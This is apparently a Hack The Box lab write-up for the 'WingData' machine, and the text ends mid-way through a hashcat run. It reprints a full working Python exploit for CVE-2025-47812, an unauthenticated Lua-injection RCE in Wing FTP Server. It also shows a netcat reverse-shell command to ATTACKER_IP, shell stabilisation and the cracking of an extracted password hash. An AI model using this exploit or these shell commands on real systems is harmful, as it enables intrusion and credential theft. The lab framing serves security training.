---
tags:
  - SN_10
link: https://app.hackthebox.com/machines/WingData
description: Easy·Linux
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/d419202507a3bbf06e764c1c4a524f66.png
solve date:
solved: true
---
## Summary

![[WingDataHTBSN10.png]]

| SECTION/TASK     | FLAG                             |
| ---------------- | -------------------------------- |
| Submit User Flag | 686f215a1ddfa587b49feaf734d81e36 |
| Submit Root Flag | f2a52d70be65e0aa9d219e4ac344c598 |

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery

### 1.1 Connecting to the HTB VPN

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

**Command:** `sudo openvpn your_file.ovpn`

Start the Machine.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.2. Verifying the Target is Reachable

Verify that the target machine is up and reachable by performing an ICMP ping test.

**Command:** `ping -c 4 TARGET_IP`

**Breakdown:**

- `-c 4` → sends 4 packets only (clean output, fast)

Output:

```shell
┌──(kali㉿kali)-[~/CS/HTB]
└─$ ping -c 4 TARGET_IP                                                                   
PING TARGET_IP (TARGET_IP) 56(84) bytes of data.
64 bytes from TARGET_IP: icmp_seq=1 ttl=63 time=283 ms
64 bytes from TARGET_IP: icmp_seq=2 ttl=63 time=289 ms
64 bytes from TARGET_IP: icmp_seq=3 ttl=63 time=280 ms
64 bytes from TARGET_IP: icmp_seq=4 ttl=63 time=286 ms

--- TARGET_IP ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3009ms
rtt min/avg/max/mdev = 280.134/284.700/288.984/3.296 ms
```

A successful response confirms that the machine is active and accessible on the HTB network, allowing us to proceed with the enumeration phase.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Enumeration

### 2.1 Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 2.1.1 The "Spearfishing" Scan (All Ports, High Speed)

**Command:** `nmap -p- --min-rate 5000 -Pn TARGET_IP`

**Breakdown:**

- **`nmap`**
    - **Description:** The utility itself.
- **`-p-`**
    - **Description:** All Ports Scan. 
    - **Purpose:** Scans all 65,535 ports. Slower but thorough.
- `--min-rate 5000`
	- **Description:** Minimum Packet Rate.
	- **Purpose:** Forces Nmap to send at least 5,000 packets per second. This reduces scan time on stable networks like the HTB VPN.
- `-Pn`
    - **Description:** Skip Host Discovery.
    - **Purpose:** Treats the host as "online" even if it doesn't respond to pings (ICMP). Many HTB boxes have firewalls that block pings.
- **`TARGET_IP`**
    - **Description:** Target Specification.
    - **Purpose:** The IP address of the host being scanned.

**Output:**

```shell
┌──(kali㉿kali)-[~/CS/HTB]
└─$ nmap -p- --min-rate 5000 -Pn TARGET_IP 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-01 03:41 -0500
Nmap scan report for TARGET_IP
Host is up (0.46s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 30.57 seconds
```
<div align="center">
<br>
<br>
</div>

#### 2.1.2 The "Deep Dive" Scan (Targeted Aggression)

**Command:** `nmap -A -p p1,p2,p3,p4 TARGET_IP`

**Breakdown:**

- `-sC`
    - **Description:** Default Script Scan.
    - **Purpose:** Runs a collection built-in Nmap Scripting Engine (NSE) scripts to find common vulnerabilities, metadata, or hidden info.
- `-sV`
    - **Description:** Version Detection.
    - **Purpose:** Probes open ports to determine what software and version are actually running (e.g., identifying "Jetty" or "OpenSSH 9.2").
- `-p`
    - **Description:** Targeted Port List.
    - **Purpose:** Restricts the heavy scanning to only the ports you confirmed are open, saving significant time and processing power.


**Output:**

```shell
┌──(kali㉿kali)-[~/CS/HTB]
└─$ nmap -A -p 22,80 TARGET_IP            
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-01 03:44 -0500
Nmap scan report for TARGET_IP
Host is up (0.28s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-title: Did not follow redirect to http://wingdata.htb/
|_http-server-header: Apache/2.4.66 (Debian)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   283.11 ms 10.10.14.1
2   288.94 ms TARGET_IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.19 seconds
```
<div align="center">
<br>
<br>
</div>

#### 2.1.3 Scan Results Analysis

| Port | **Service** | **Version**                    | **Analysis**                                                                                                                                            |
| ---- | ----------- | ------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 22   | SSH         | OpenSSH 9.2p1 Debian 2+deb12u7 | Standard secure shell. Version is relatively modern; unlikely to yield an easy "Low Hang" exploit. Useful for later credential spraying or persistence. |
| 80   | HTTP        | Apache httpd 2.4.66 (Debian)   | **Primary Attack Vector.** Note the redirect to `http://wingdata.htb/`. This suggests Virtual Hosting is in use and requires local DNS modification.    |

When you see `Did not follow redirect to http://facts.htb/` in Nmap, the server is essentially saying:

"I know you're at `TARGET_IP`, but I am configured to only talk to people who call me `wingdata.htb`."

This is a **301 (Permanent)** or **302 (Found)** redirect. Browsers follow this automatically, but Nmap just reports it. If the name isn't in your `/etc/hosts`, the browser follows the redirect into a "Dead End."
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.2 Enumeration of Web Services

#### 2.2.1 Update Hosts File

Command: `sudo vi etc/hosts`

**Breakdown:**

- `sudo` 
	- Description: Elevated Privileges
	- Purpose: Required to modify system-level configuration files like the hosts database.
- `vi` 
	- Description: Terminal Text Editor
	- Purpose: Used to append the `TARGET_IP wingdata.htb` entry to the file.
- `/etc/hosts` 
	- Description: Static Host Lookup Table
	- Purpose: The local file that takes precedence over DNS servers, ensuring the domain resolves to the CTF machine.

<div align="center">
<br>
<br>
</div>
##### How Hostname Resolution Works

When you type a URL like `google.com` or `wingdata.htb` into your browser, your computer needs to translate that text into a numerical IP address. It follows a specific order of operations:

1. **The Browser Cache:** Your browser checks if it already knows the IP from a previous visit.
2. **The Hosts File (`/etc/hosts`):** This is your computer's "private address book." It checks here **first** before asking the internet. If an entry exists, it stops looking and goes to that IP.
3. **DNS Servers:** If the name isn't in your private book, your computer asks a DNS server (like Google’s `8.8.8.8` or your ISP).

##### Why `google.com` works but `wingdata.htb` doesn't

- **Public Sites:** `google.com` is registered on public DNS servers. When you ask the internet "Where is Google?", the internet has an official answer.

- **HTB Sites:** `wingdata.htb` is a **private domain** inside the HTB lab environment. Public DNS servers have no idea it exists. Because your computer can't find an "official" record, it gives you a "Server Not Found" error—unless you write the address into your private address book (`/etc/hosts`) yourself.
<div align="center">
<br>
<br>
</div>

#### 2.2.2 Web Enumeration

Browse to `http://wingdata.htb/`.

![[Pasted image 20260301121847.png]]

Upon clicking the **Client Portal** button located in the page header, the application attempts to redirect to `http://ftp.wingdata.htb`.

![[Pasted image 20260301123826.png|1093]]

Since the initial `/etc/hosts` update only accounted for the apex domain, this new subdomain must be manually added to the local resolution table to continue the enumeration of the FTP-related web services.

**Command:** `sudo vi /etc/hosts`

```shell
┌──(kali㉿kali)-[~/CS/HTB]
└─$ cat /etc/hosts
...
TARGET_IP     wingdata.htb
TARGET_IP     ftp.wingdata.htb
```

Refresh `http://ftp.wingdata.htb`.

![[Pasted image 20260301125509.png]]

After updating the local `hosts` file to resolve the `ftp.wingdata.htb` subdomain, refresh the page on your browser. You're instantly redirecting to a minimalist login portal. 
Inspection of the page footer shows "FTP server software powered by **[Wing FTP Server v7.4.3](https://www.wftpserver.com/)**" which is actionable intelligence regarding the backend technology in use.
<div align="center">
<br>
<br>
</div>

#### 2.2.3 Vulnerability Research

The `http://ftp.wingdata.htb` page identifies the site as running **Wing FTP Server v7.4.3**. With this information, we can search for known weaknesses that could lead to a compromise.

Search online for `Wing FTP Server v7.4.3 exploit`.

![[Pasted image 20260301132057.png]]

The exploit is CVE-2025-47812. 

**CVE-2025-47812** is a high-impact vulnerability because it allows for **Unauthenticated Remote Code Execution (RCE)** by exploiting a logic flaw in how the server handles memory and session files.

The vulnerability exists due to a "discrepancy" in how the Wing FTP Server processes strings during the login process. It is essentially a **Null Byte Injection** that leads to **Lua Code Injection**.

- **The Flaw in `c_CheckUser()`:** This function uses `strlen()` to validate the username. In C-based languages, `strlen()` stops reading once it hits a Null Byte (`%00`). If an attacker sends `anonymous%00[payload]`, the server only "sees" and validates `anonymous`, allowing authentication to succeed.

- **The Session Injection:** While the validator only sees the first half, the session creation logic in `loginok.html` saves the **entire** unsanitized string into a session file on the disk.

- **Execution:** Wing FTP stores sessions as Lua scripts. By using the Null Byte to "break" the expected string and then adding Lua tags (`]]`), an attacker can insert malicious commands. When the server later loads that session file via `loadfile()`, it executes the injected Lua code.
<div align="center">
<br>
<br>
</div>

#### 2.2.4 Exploit Identification

The next step is to find or develop a **Proof of Concept** to verify if `http://ftp.wingdata.htb` is susceptible.

Repository found: CVE-2025-47812-poc [^1]

![[Pasted image 20260301134121.png]]
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Exploitation

### 3.1. Exploit Acquisition and Preparation

Clone the repository from GitHub to your local attack machine.

**Command:** `git clone https://github.com/4m3rr0r/CVE-2025-47812-poc.git`

**Breakdown:**

- **`git clone`**
    - **Description:** Repository Cloning Tool.
    - **Purpose:** Copies the entire remote project, including scripts and documentation, from GitHub to a local directory on your machine.
- **`https://github.com/4m3rr0r/CVE-2025-47812-poc.git`**
    - **Description:** Remote Source URL.
    - **Purpose:** Points to the specific repository containing the exploit code.

**Output:**

```shell
┌──(kali㉿kali)-[~/pueman/HTB/WingData]
└─$ git clone https://github.com/4m3rr0r/CVE-2025-47812-poc.git
Cloning into 'CVE-2025-47812-poc'...
remote: Enumerating objects: 38, done.
remote: Counting objects: 100% (38/38), done.
remote: Compressing objects: 100% (36/36), done.
remote: Total 38 (delta 18), reused 3 (delta 2), pack-reused 0 (from 0)
Receiving objects: 100% (38/38), 323.62 KiB | 400.00 KiB/s, done.
Resolving deltas: 100% (18/18), done.

┌──(kali㉿kali)-[~/pueman/HTB/WingData]
└─$ cd CVE-2025-47812-poc ; ls 
2025-07-01_18-22.png  CVE-2025-47812.py  LICENSE  README.md
```

**Poc Audit:**

```shell
┌──(kali㉿kali)-[~/pueman/HTB/WingData/CVE-2025-47812-poc]
└─$ cat CVE-2025-47812.py  
```

``` python
# Exploit Title: Wing FTP Server 7.4.3 - Unauthenticated Remote Code Execution (RCE)
# CVE: CVE-2025-47812
# Date: 2025-06-30
# Exploit Author: Sheikh Mohammad Hasan aka 4m3rr0r (https://github.com/4m3rr0r)
# Vendor Homepage: https://www.wftpserver.com/
# Version: Wing FTP Server <= 7.4.3
# Tested on: Linux (Root Privileges), Windows (SYSTEM Privileges)

# Description:
# Wing FTP Server versions prior to 7.4.4 are vulnerable to an unauthenticated remote code execution (RCE)
# flaw (CVE-2025-47812). This vulnerability arises from improper handling of NULL bytes in the 'username'
# parameter during login, leading to Lua code injection into session files. These maliciously crafted
# session files are subsequently executed when authenticated functionalities (e.g., /dir.html) are accessed,
# resulting in arbitrary command execution on the server with elevated privileges (root on Linux, SYSTEM on Windows).
# The exploit leverages a discrepancy between the string processing in c_CheckUser() (which truncates at NULL)
# and the session creation logic (which uses the full unsanitized username).

# Proof-of-Concept (Python):
# The provided Python script automates the exploitation process.
# It injects a NULL byte followed by Lua code into the username during a POST request to loginok.html.
# Upon successful authentication (even anonymous), a UID cookie is returned.
# A subsequent GET request to dir.html using this UID cookie triggers the execution of the injected Lua code,
# leading to RCE.


import requests
import re
import argparse

# ANSI color codes
RED = "\033[91m"
GREEN = "\033[92m"
RESET = "\033[0m"

def print_green(text):
    print(f"{GREEN}{text}{RESET}")

def print_red(text):
    print(f"{RED}{text}{RESET}")

def run_exploit(target_url, command, username="anonymous", password="", verbose=False):
    login_url = f"{target_url}/loginok.html"

    login_headers = {
        "Host": target_url.split('//')[1].split('/')[0],
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": target_url,
        "Connection": "keep-alive",
        "Referer": f"{target_url}/login.html?lang=english",
        "Cookie": "client_lang=english",
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i"
    }

    from urllib.parse import quote
    encoded_username = quote(username)
    encoded_password = quote(password)

    payload = (
        f"username={encoded_username}%00]]%0dlocal+h+%3d+io.popen(\"{command}\")%0dlocal+r+%3d+h%3aread(\"*a\")"
        f"%0dh%3aclose()%0dprint(r)%0d--&password={encoded_password}"
    )

    if verbose:
        print_green(f"[+] Sending POST request to {login_url} with command: '{command}' and username: '{username}'")

    try:
        login_response = requests.post(login_url, headers=login_headers, data=payload, timeout=10)
        login_response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print_red(f"[-] Error sending POST request to {login_url}: {e}")
        return False

    set_cookie = login_response.headers.get("Set-Cookie", "")
    match = re.search(r'UID=([^;]+)', set_cookie)

    if not match:
        print_red("[-] UID not found in Set-Cookie. Exploit might have failed or response format changed.")
        return False

    uid = match.group(1)
    if verbose:
        print_green(f"[+] UID extracted: {uid}")

    dir_url = f"{target_url}/dir.html"
    dir_headers = {
        "Host": login_headers["Host"],
        "User-Agent": login_headers["User-Agent"],
        "Accept": login_headers["Accept"],
        "Accept-Language": login_headers["Accept-Language"],
        "Accept-Encoding": login_headers["Accept-Encoding"],
        "Connection": "keep-alive",
        "Cookie": f"UID={uid}",
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i"
    }

    if verbose:
        print_green(f"[+] Sending GET request to {dir_url} with UID: {uid}")

    try:
        dir_response = requests.get(dir_url, headers=dir_headers, timeout=10)
        dir_response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print_red(f"[-] Error sending GET request to {dir_url}: {e}")
        return False

    body = dir_response.text
    clean_output = re.split(r'<\?xml', body)[0].strip()

    if verbose:
        print_green("\n--- Command Output ---")
        print(clean_output)
        print_green("----------------------")
    else:
        if clean_output:
            print_green(f"[+] {target_url} is vulnerable!")
        else:
            print_red(f"[-] {target_url} is NOT vulnerable.")

    return bool(clean_output)

def main():
    parser = argparse.ArgumentParser(description="Exploit script for command injection via login.html.")
    parser.add_argument("-u", "--url", type=str,
                        help="Target URL (e.g., http://192.168.134.130). Required if -f not specified.")
    parser.add_argument("-f", "--file", type=str,
                        help="File containing list of target URLs (one per line).")
    parser.add_argument("-c", "--command", type=str,
                        help="Custom command to execute. Default: echo this is vulnerable to CVE-2025-47813. If specified, verbose output is enabled automatically.")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Show full command output (verbose mode). Ignored if -c is used since verbose is auto-enabled.")
    parser.add_argument("-o", "--output", type=str,
                        help="File to save vulnerable URLs.")
    parser.add_argument("-U", "--username", type=str, default="anonymous",
                        help="Username to use in the exploit payload. Default: anonymous")
    parser.add_argument("-P", "--password", type=str, default="",
                        help="Password to use in the exploit payload. Default: <null>")

    args = parser.parse_args()

    if not args.url and not args.file:
        parser.error("Either -u/--url or -f/--file must be specified.")

    command_to_use = args.command if args.command else "this is vulnerable to CVE-2025-47812"
    verbose_mode = True if args.command else args.verbose

    vulnerable_sites = []

    targets = []
    if args.file:
        try:
            with open(args.file, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print_red(f"[-] Could not read target file '{args.file}': {e}")
            return
    else:
        targets = [args.url]

    for target in targets:
        print(f"\n[*] Testing target: {target}")
        is_vulnerable = run_exploit(target, command_to_use, username=args.username, password=args.password, verbose=verbose_mode)
        if is_vulnerable:
            vulnerable_sites.append(target)

    if args.output and vulnerable_sites:
        try:
            with open(args.output, 'w') as out_file:
                for site in vulnerable_sites:
                    out_file.write(site + "\n")
            print_green(f"\n[+] Vulnerable sites saved to: {args.output}")
        except Exception as e:
            print_red(f"[-] Could not write to output file '{args.output}': {e}")

if __name__ == "__main__":
    main()
```


Logic Flow of the Script:

1. **Stage 1 (Injection):** It sends a `POST` request to `loginok.html`. The `username` parameter is crafted as: `username%00]] [Lua Code] --`. This bypasses the check but writes the code to the session.

2. **Stage 2 (Extraction):** The script parses the `Set-Cookie` header from the server's response to grab the **UID** (Session ID).

3. **Stage 3 (Trigger):** It makes a `GET` request to `dir.html` using that **UID**. The server loads the "poisoned" session file, executes the Lua code, and the script prints the output of your command back to your terminal.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.2 Executing `CVE-2025-47812.py`

**Test for Vulnerability:** `python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "whoami"`

Output:

```shell
┌──(kali㉿kali)-[~/pueman/HTB/WingData/CVE-2025-47812-poc]
└─$ python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "whoami"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'whoami' and username: 'anonymous'
[+] UID extracted: 9d52dcf82d167b395295d0451e0bcc03f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 9d52dcf82d167b395295d0451e0bcc03f528764d624db129b32c21fbca0cb8d6                                                                                                  

--- Command Output ---                                                                                              
wingftp
----------------------
```

**Gain a Reverse Shell:**

Once RCE is confirmed, the logical next step is to move from single command execution to an interactive shell.

**Listener:** On your Kali machine, start a listener: `nc -lvnp 4444`.

**Breakdown:**

- `-l`
	- Description: Listen Mode
	- Purpose: Sets netcat to wait for an incoming connection.
- `-v`
	- Description: Verbose
	- Purpose: Displays information about the connection source.
- `-n`
	- Description: No DNS
	- Purpose: Prevents delays by not resolving hostnames.
- `-p 4444`
	- Description: Port Number
	- Purpose: Matches the port used in the exploit payload.

**Exploit:** Run the script with a bash reverse shell payload:

Command: `python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc ATTACKER_IP 4444 -e /bin/sh" -v`

Breakdown:

- `nc 10.10.14.247 4444`
	- Description: Netcat Client
	- Purpose: Directs the target to connect to the attacker's listener at the specified IP and port.

- `-e /bin/sh`
	- Description: Execute Flag
	- Purpose: Binds the system shell to the network socket, providing remote command-line access.

- `-v` Description:
	- Verbose Mode
	- Purpose: Provides real-time feedback on the injection and extraction process.

Output:

```shell
┌──(kali㉿kali)-[~/pueman/HTB/WingData/CVE-2025-47812-poc]
└─$ python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc ATTACKER_IP 4444 -e /bin/sh" -v

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'nc ATTACKER_IP 4444 -e /bin/sh' and username: 'anonymous'
[+] UID extracted: bd0319a294e1a9b234377e194ed1ec64f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: bd0319a294e1a9b234377e194ed1ec64f528764d624db129b32c21fbca0cb8d6
[-] Error sending GET request to http://ftp.wingdata.htb/dir.html: HTTPConnectionPool(host='ftp.wingdata.htb', port=80): Read timed out. (read timeout=10)
```

```
┌──(kali㉿kali)-[~/pueman/HTB/WingData/CVE-2025-47812-poc]
└─$ nc -lvnp 4444               
listening on [any] 4444 ...
connect to [10.10.14.247] from (UNKNOWN) [10.129.9.90] 54034
```

The terminal output confirms that you have achieved a **Reverse Shell** on the target. The `Read timed out` error in your exploit script is actually a positive indicator in this specific context: the web server is "hanging" the HTTP request because it is busy maintaining the open socket for your netcat connection.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Post-Exploitation

### 4.1 Shell Stabilization

The current shell is likely a "dumb" shell, meaning it lacks tab completion, job control, and the ability to use interactive commands like `top` or `nano`. Stabilizing this shell is the first priority to prevent accidental disconnection.

**Command:** `python3 -c 'import pty; pty.spawn("/bin/bash")'`

**Breakdown:**

- `import pty`
	- Description: Pseudo-Terminal Module
	- Purpose: Accesses Python's internal library for terminal control.
- `pty.spawn("/bin/bash")`
	- Description: Terminal Spawning
	- Purpose: Upgrades the current raw `/bin/sh` to a more feature-rich `/bin/bash` instance.

**Output:**

```shell
┌──(kali㉿kali)-[~/pueman/HTB/WingData/CVE-2025-47812-poc]
└─$ nc -lvnp 4444      
listening on [any] 4444 ...
connect to [10.10.14.247] from (UNKNOWN) [10.129.9.145] 45160
python3 -c 'import pty; pty.spawn("/bin/bash")'
wingftp@wingdata:/opt/wftpserver$ 
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.2 File System Enumeration

```shell
wingftp@wingdata:/opt/wftpserver$ ls
ls
Data         pid-wftpserver.pid  version.txt  wftp_default_ssh.key
License.txt  README              webadmin     wftp_default_ssl.crt
Log          session             webclient    wftp_default_ssl.key
lua          session_admin       wftpconsole  wftpserver
wingftp@wingdata:/opt/wftpserver$ cd /
cd /
wingftp@wingdata:/$ ls
ls
bin   etc         initrd.img.old  lost+found  opt   run   sys  var
boot  home        lib             media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old
wingftp@wingdata:/$ find / -name user.txt 2>/dev/null
find / -name user.txt 2>/dev/null
wingftp@wingdata:/$ cd home
cd home
wingftp@wingdata:/home$ ls
ls
wacky
wingftp@wingdata:/home$ ls wacky
ls wacky
ls: cannot open directory 'wacky': Permission denied
wingftp@wingdata:/home$ 
```

Initial Enumeration in the home directory reveals a single user account named **wacky** and attempts to access the `/home/wacky` directory are met with a **Permission Denied** error.

A system-wide search for "wacky" identified a critical configuration file within the application's internal data directory. This file stores metadata and authentication details for the FTP user.

```shell
wingftp@wingdata:/opt/wftpserver/Data$ find / -name "*wacky*" 2>/dev/null
find / -name "*wacky*" 2>/dev/null
/opt/wftpserver/Data/1/users/wacky.xml
/home/wacky
wingftp@wingdata:/opt/wftpserver/Data$ cat /opt/wftpserver/Data/1/users/wacky.xml
```
<div align="center">
<br>
<br>
</div>

#### 4.2.1 Analyzing wacky.xml

```xml
<er/Data$ cat /opt/wftpserver/Data/1/users/wacky.xml
<?xml version="1.0" ?>
<USER_ACCOUNTS Description="Wing FTP Server User Accounts">
    <USER>
        <UserName>wacky</UserName>
        <EnableAccount>1</EnableAccount>
        <EnablePassword>1</EnablePassword>
        <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
        <ProtocolType>63</ProtocolType>
        <EnableExpire>0</EnableExpire>
        <ExpireTime>2025-12-02 12:02:46</ExpireTime>
        <MaxDownloadSpeedPerSession>0</MaxDownloadSpeedPerSession>
        <MaxUploadSpeedPerSession>0</MaxUploadSpeedPerSession>
        <MaxDownloadSpeedPerUser>0</MaxDownloadSpeedPerUser>
        <MaxUploadSpeedPerUser>0</MaxUploadSpeedPerUser>
        <SessionNoCommandTimeOut>5</SessionNoCommandTimeOut>
        <SessionNoTransferTimeOut>5</SessionNoTransferTimeOut>
        <MaxConnection>0</MaxConnection>
        <ConnectionPerIp>0</ConnectionPerIp>
        <PasswordLength>0</PasswordLength>
        <ShowHiddenFile>0</ShowHiddenFile>
        <CanChangePassword>0</CanChangePassword>
        <CanSendMessageToServer>0</CanSendMessageToServer>
        <EnableSSHPublicKeyAuth>0</EnableSSHPublicKeyAuth>
        <SSHPublicKeyPath></SSHPublicKeyPath>
        <SSHAuthMethod>0</SSHAuthMethod>
        <EnableWeblink>1</EnableWeblink>
        <EnableUplink>1</EnableUplink>
        <EnableTwoFactor>0</EnableTwoFactor>
        <TwoFactorCode></TwoFactorCode>
        <ExtraInfo></ExtraInfo>
        <CurrentCredit>0</CurrentCredit>
        <RatioDownload>1</RatioDownload>
        <RatioUpload>1</RatioUpload>
        <RatioCountMethod>0</RatioCountMethod>
        <EnableRatio>0</EnableRatio>
        <MaxQuota>0</MaxQuota>
        <CurrentQuota>0</CurrentQuota>
        <EnableQuota>0</EnableQuota>
        <NotesName></NotesName>
        <NotesAddress></NotesAddress>
        <NotesZipCode></NotesZipCode>
        <NotesPhone></NotesPhone>
        <NotesFax></NotesFax>
        <NotesEmail></NotesEmail>
        <NotesMemo></NotesMemo>
        <EnableUploadLimit>0</EnableUploadLimit>
        <CurLimitUploadSize>0</CurLimitUploadSize>
        <MaxLimitUploadSize>0</MaxLimitUploadSize>
        <EnableDownloadLimit>0</EnableDownloadLimit>
        <CurLimitDownloadLimit>0</CurLimitDownloadLimit>
        <MaxLimitDownloadLimit>0</MaxLimitDownloadLimit>
        <LimitResetType>0</LimitResetType>
        <LimitResetTime>1762103089</LimitResetTime>
        <TotalReceivedBytes>0</TotalReceivedBytes>
        <TotalSentBytes>0</TotalSentBytes>
        <LoginCount>2</LoginCount>
        <FileDownload>0</FileDownload>
        <FileUpload>0</FileUpload>
        <FailedDownload>0</FailedDownload>
        <FailedUpload>0</FailedUpload>
        <LastLoginIp>127.0.0.1</LastLoginIp>
        <LastLoginTime>2025-11-02 12:28:52</LastLoginTime>
        <EnableSchedule>0</EnableSchedule>
    </USER>
</USER_ACCOUNTS>
```

The contents of `wacky.xml` reveal the security parameters for the account. Most importantly, it contains a hexadecimal string in the `<Password>` field.

**Extracted Data:**
- **Username:** `wacky`
- **Account Enabled:** `1` (True)
- **Password Hash:** `32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca`
<div align="center">
<br>
<br>
</div>

#### 4.2.2 Hash Analysis and Cracking

> Based on Wing FTP Server documentation, user and administrator passwords in version 7.x (including 7.4.3) are typically hashed using **SHA-256** (or MD5 as a fallback) with a specific salt. 
> 
> - **Default Salt:** The default salt used for administrator passwords is the string **`WingFTP`**.
> - **Formula:** The password is often stored as **SHA256(Password+"WingFTP")**.
> - **Dynamic Salt Option:** For user accounts, the system allows the use of the dynamic variable **`%Name`** as a salt, which is replaced by the actual username.

![[Pasted image 20260301185221.png]]

To proceed, we must attempt to crack this hash. 

**Command:** `hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt` 

**Breakdown:**

- `hashcat`
	- Description: Advanced Password Recovery Tool
	- Purpose: Used to perform a high-speed dictionary attack against the hash.
- `-m 1410`
	- Description: Hash Type. SHA2-256 (Password + Salt)
	- Purpose: Instructs Hashcat to expect a salt after a colon and use it in the hashing logic.
- `hash.txt`
	- Description: Input File
	- Purpose: Contains the 64-character string extracted from the XML.
- `rockyou.txt`
	- Description: Wordlist
	- Purpose: The standard dictionary used for cracking common passwords.

**Output:**

```shell                                            
┌──(kali㉿kali)-[~/pueman/HTB/WingData]
└─$ cat hash.txt                                                                                     
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP

┌──(kali㉿kali)-[~/pueman/HTB/WingData]
└─$ hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt                                        
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i5-13420H, 1433/2867 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

